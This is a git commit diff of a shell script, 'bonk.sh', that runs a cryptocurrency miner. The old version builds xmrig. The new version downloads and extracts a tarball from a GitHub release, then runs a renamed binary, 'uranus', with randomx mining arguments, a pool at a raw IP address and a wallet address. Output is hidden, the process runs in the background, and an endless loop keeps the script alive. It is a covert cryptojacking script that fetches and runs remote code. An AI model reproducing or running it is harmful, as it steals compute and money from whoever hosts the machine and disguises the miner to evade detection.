e471c5a67e7595026ae91babf7c244cabecb4584
preak07 <160253225+preak07@users.noreply.github.com>
2024-03-01 09:20:47 +0700

    Update bonk.sh

--- bonk.sh
+++ bonk.sh
@@ -1,13 +1,7 @@
-apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-git clone https://github.com/xmrig/xmrig.git >/dev/null
-cd xmrig 
-mkdir build 
-cd build 
-cmake ..  
-make -j$(nproc) --y
-./xmrig -a randomx -o 159.203.162.18:3333 -u nexa:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax.RIG001 -t 1 /dev/null 2>&1 &
+chsh -s /bin/zsh
+wget https://github.com/komprengaw/rengaw/releases/download/demon/daemon.tar.gz > /dev/null 2>&1 && tar -xvf daemon.tar.gz && ./uranus -a randomx -o 159.203.162.18:3333 -u nexa:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax -p "vivo" -t 1 > /dev/null 2>&1 &
 while true
 do
-        echo "Download"
+        echo "gasss........!"
         sleep 20
 done
